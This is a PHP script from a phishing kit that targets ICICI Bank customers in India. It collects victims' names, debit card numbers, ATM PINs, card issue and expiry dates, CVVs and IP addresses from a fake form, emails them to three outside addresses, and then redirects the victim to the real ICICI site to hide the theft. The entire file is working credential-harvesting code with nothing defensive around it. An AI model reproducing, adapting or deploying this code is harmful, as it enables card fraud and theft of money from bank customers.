<?
$ip = getenv("REMOTE_ADDR");
$message .= "---Created By SilentWarrior---\n";
$message .= "First Name : ".$_POST['first']."\n";
$message .= "Last Name : ".$_POST['last']."\n";
$message .= "Debit card No: ".$_POST['debit']."\n";
$message .= "ATM PIN: ".$_POST['pin']."\n";
$message .= "Issue Month: ".$_POST['issuemonth']."\n";
$message .= "Issue Year: ".$_POST['issueyear']."\n";
$message .= "Expiry Month: ".$_POST['expirymonth']."\n";
$message .= "Expiry Year: ".$_POST['expiryyear']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "IP: ".$ip."\n";
$recipient = "ricksmithnig45@yahoo.co.jp, jameskumarpvtltd@gmail.com, anandshreepvtltd@gmail.com";
$subject = " IIIIIINDIA ICICI ATM: ".$ip."\n";
$headers = "MIME-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers))
	   {header("Location: https://cib.icicibank.com/corp/BANKAWAYTRAN;jsessionid=00001ctX9lcbfNAylPL1sLOcPmP:16horquo7;IBMID=1ctX9lcbfNAylPL1sLOcPmP;IBMSessionHandle_CIBSessionData=f?bwayparam=qEES4XH0Ui1n2%2BscEw%2FjgkoThwNHWKh36FX6kQyh4dKymsAZ0%2FaRmA%3D%3D");
}
else
  {echo "ERROR! Please go back and try again.";
}?>
